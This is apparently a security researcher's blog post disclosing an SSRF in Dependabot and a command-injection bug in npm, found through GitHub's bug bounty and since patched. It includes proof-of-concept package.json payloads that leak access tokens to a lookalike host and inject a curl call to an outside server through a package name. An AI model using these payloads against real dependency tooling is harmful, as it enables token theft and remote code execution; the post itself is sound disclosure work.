---
title: "Diving into Dependabot along with a bug in npm"
date: 2021-07-12T23:30:00+09:00
url: /posts/2021-06-27-dependabot-rce/
type: post
showTableOfContents: true
---

If you are developing some applications on GitHub, you might have seen pull requests from Depedabot.
It automatically finds outdated vulnerable packages and sends pull requests to fix that.

![](screenshot1.png)

It is enabled by default and can make a commit on `dependabot/*` branch of many repositories on GitHub.
Therefore, I thought If I could gain a controll of Dependabot, I can steal write permissions of those repositories.
So I started to look into Dependabot.

# SSRF in Dependabot

The core module of the Dependabot is open-sourced (<https://github.com/dependabot/dependabot-core>), so we can use Dependabot outside of GitHub.
To start the investigation, I prepared an local Dependabot environment following [the official sample code](https://github.com/dependabot/dependabot-script).

This sample code requires GitHub access token to fetch the source code of the repository.

https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb?slice=16:23#LL17-L23
```ruby
credentials =
  [{
    "type" => "git_source",
    "host" => "github.com",
    "username" => "x-access-token",
    "password" => "a-github-access-token"
  }]
```

My first idea is to deceiving a Dependabot so that the bot will sends the token to my server instead of GitHub.
This idea seems possible because there are flaws in URL validations.

One of the validations is to check whether the URL contains `github.com` or not.
Obviously, this validation accepts a URL such as `github.com.mocos.kitchen`.

https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L8
```ruby
    KNOWN_HOSTS = /github\.com|bitbucket\.org|gitlab.com/i.freeze
```

https://github.com/dependabot/dependabot-core/blob/f5151ed385a267a13c6778dec5197af574f39d92/common/lib/dependabot/git_metadata_fetcher.rb#L55
```ruby
      raise Dependabot::GitDependenciesNotReachable, [uri] unless uri.match?(KNOWN_HOSTS)
```

Another one uses following regexp which accepts a URL such as `git+https://github.com.mocos.kitchen/username/repo`.

https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_parser.rb?slice=27:37#L28-L37
```ruby
      GIT_URL_REGEX = %r{
        (?<git_prefix>^|^git.*?|^github:|^bitbucket:|^gitlab:|github\.com/)
        (?<username>[a-z0-9-]+)/
        (?<repo>[a-z0-9_.-]+)
        (
          (?:\#semver:(?<semver>.+))|
          (?:\#(?=[\^~=<>*])(?<semver>.+))|
          (?:\#(?<ref>.+))
        )?$
      }ix.freeze
```

Based on these tricks, Dependabot treats `git+https://github.com.mocos.kitchen/username/repo` as a valid GitHub's URL.

## Token stealing demo

To proof this concept, I created [a sample repository](https://github.com/tyage/dependabot-test-app) that includes following `package.json` file.

https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/package.json
```json
{
  "dependencies": {
    "package1": "git+https://github.com.mocos.kitchen/username/repo"
  }
}
```

Next, I updated the `credentials`, `repo_name` and `dependency_name` in [update-scripts.rb](https://github.com/dependabot/dependabot-script/blob/4330ff7043b6fe2bb009005e2f5b0ca9985f32f2/update-script.rb) from the official sample code so that we can run dependency checker against the sample repository I created.
When I run the script, my server - `github.com.mocos.kitchen` - received a request containing GitHub Access Token.

It means, if someone run a dependency checker against malicious repository, their GitHub Access Token will be stolen!

```
GET /username/repo.git/info/refs?service=git-upload-pack HTTP/1.0
Host: localhost:3000
Connection: close
User-Agent: dependabot-core/0.142.0 excon/0.79.0 ruby/2.6.6 (x86_64-darwin20) (+https://github.com/dependabot/dependabot-core)
Authorization: Basic eC1hY2Nlc3MtdG9rZW46Z2hw*************************************
Accept-Encoding: deflate, gzip
```

## First dive into a Dependabot server

Next, in order to try this attack in GitHub environment, I enabled Dependabot alerts in the sample repository.
We can do this by simply creating a `.github/dependabot.yml` file.

https://github.com/tyage/dependabot-test-app/blob/7f348994737bc39ab5ff443b6132f34c0c593328/.github/dependabot.yml
```yaml
---
version: 2
updates:
  - package-ecosystem: npm
    directory: "/"
    schedule:
      interval: daily
```
I successfully received a HTTP request from a Dependabot in GitHub.
But contrary to my expectation, there is no GitHub Access Token in the request.
Afterwards, it turns out that those servers are using special HTTP proxy which enalbes the bot to access target repository without GitHub Access Token.

```
GET /username/repo.git/info/refs?service=git-upload-pack HTTP/1.0
Host: localhost:3000
Connection: close
User-Agent: dependabot-core/0.156.4 excon/0.83.0 ruby/2.7.1 (x86_64-linux-gnu) (+https://github.com/dependabot/dependabot-core)
Accept-Encoding: gzip
```

I couldn't steal the token from GitHub's Dependabot server by SSRF, but after some investigation, I found another bug.

# Get the shell of a Dependabot server

When I tried some payload, I came across with a pattern that triggers a shell command in Dependabot server.
With the package name `https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/...`, a shell command `curl$IFS@mocos.kitchen:3001` was executed and we could see the request!

https://github.com/tyage/dependabot-test3/blob/a81ac0bb60ac5aad66fa3191b5276f633a6d421d/package.json
```json
{
  "name": "javascript",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "private": true,
  "dependencies": {
    "tyage-sample-package": "https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/github.com/tyage/sample-package.git#semver:4.0.0"
  }
}
```

I got the shell of the Dependabot server suddenly, but unfortunately, what we can do in the server is limited.
Here is what I could do:

- Access to the internal HTTP proxy which enables us to access to the target GitHub repository
- Access to the internal API server which enalbes us to create a pull request as a Dependabot
- Bitcoin mining :)

Therefore, we couldn't obtain read/write access of other user's repository.
(If we can pwn the internal HTTP proxy or API server, it will allow us to escalate the permission, I guess.)

Even though I couldn't get the access to other user's repository, I could impersonate as a verified Dependabot account and create a commit and pull request by calling internal API.

<https://github.com/tyage/dependabot-test3/pull/31>

![https://github.com/tyage/dependabot-test3/pull/31](screenshot2.png)

![https://github.com/tyage/dependabot-test3/pull/31](screenshot3.png)

## RCE in npm

By the way, what was happend to Dependabot when I changed the package name to `https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);...`?
I found that the command was executed in `run_npm_7_top_level_updater` method.
In this method, the bot runs `npm install` command with `--ignore-scripts --package-lock-only` arguments so that it can see if the lock file is updated without running install scripts.

https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/npm_and_yarn/lib/dependabot/npm_and_yarn/file_updater/npm_lockfile_updater.rb#L183-L192
```ruby
          command = [
            "npm",
            "install",
            *install_args,
            "--force",
            "--dry-run",
            "false",
            "--ignore-scripts",
            "--package-lock-only"
          ].join(" ")
```

Therefore, I thought Dependabot doesn't escape the arguments, but it does properly escapes all command arguments.

https://github.com/dependabot/dependabot-core/blob/2f0db3e851ba2cc43d0b6dcd70da5e69d5b63eb6/common/lib/dependabot/shared_helpers.rb#L274
```ruby
      cmd = allow_unsafe_shell_command ? command : escape_command(command)
```

So I manually run `npm install` command to see what was happened and...

```
$ npm install 'git+https://github.com/tyage/sample-package;echo HELLO > a;' --ignore-scripts
npm ERR! code 127
npm ERR! command failed
npm ERR! command git ls-remote ssh://git@github.com/tyage/sample-package;echo HELLO > a; .git
npm ERR! 8b7e1769b6df4461c8e89e6d0a2035c4512409cd HEAD
npm ERR! 8b7e1769b6df4461c8e89e6d0a2035c4512409cd refs/heads/main
npm ERR! 8b7e1769b6df4461c8e89e6d0a2035c4512409cd refs/tags/4.0.0
npm ERR! 8b7e1769b6df4461c8e89e6d0a2035c4512409cd refs/tags/5.0.0
npm ERR! zsh:1: command not found:  .git

npm ERR! A complete log of this run can be found in:
npm ERR!     /Users/tyage/.npm/_logs/2021-04-06T09_39_20_675Z-debug.log
$ cat a
HELLO
```

Yes, the bug is in npm!
Even if there is a `--ignore-scripts` option, we can execute a shell command injected in a package name!

When we call `npm install` command with `git+https://...` package name, `git ls-remote` command is triggered using `child_process.spawn` method.

https://github.com/npm/cli/blob/dedb9c8f8b0891b30aa76e60cdb1c4f0f9b2f22f/node_modules/%40npmcli/promise-spawn/index.js#L36
```javascript
    proc = spawn(cmd, args, opts)
```

Also, if `child_process.spawn` method is called with `shell` option, [the command will be run inside of the shell](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options).

npm passes `opts` variable, which contains npm config, as an option argument.
It means `opts.shell` is same with [`shell` config](https://docs.npmjs.com/cli/v7/using-npm/config#shell) which default value is a `$SHELL` environment variable or `bash` on Posix

You can see your config of the npm with `npm config` command.

```
$ npm config get shell
/bin/zsh
```

Summarizing the above, npm calls `child_process.spawn` so that they can execute `git ls-remote 'git+https://....'`, but since they set the `shell` option, malicious shell command - starts from `;` or `$(` - in the package name is evaluated.

I reported this bug to the teams and [it was resolved in npm 7.10.0](https://github.com/npm/git/pull/29).
I asked if they issue CVE but they answered they will not.

But as you know, the action "installing a malicious npm package" itself is already dangerous, so this bug only affects to limited situations such as a dependency checker.

# Timeline

I reported SSRF to Dependabot and RCE to npm, and received bounties $617 and $7,500 respectively.

Interestingly, both of them are in the scope of [GitHub Bug Bounty Program](https://hackerone.com/github).

Report to Dependabot:

- **2021/03/31 08:50:30 UTC** Reported Dependabot issue
- **2021/04/23 09:54:22 UTC** Bounty Rewarded

Report to npm:

- **2021/04/06 10:23:49 UTC** Reported npm issue
- **2021/04/07 17:53:57 UTC** Issue triaged
- **2021/04/28 19:41:59 UTC** Issue patched
- **2021/05/04 14:42:21 UTC** Bounty Rewarded
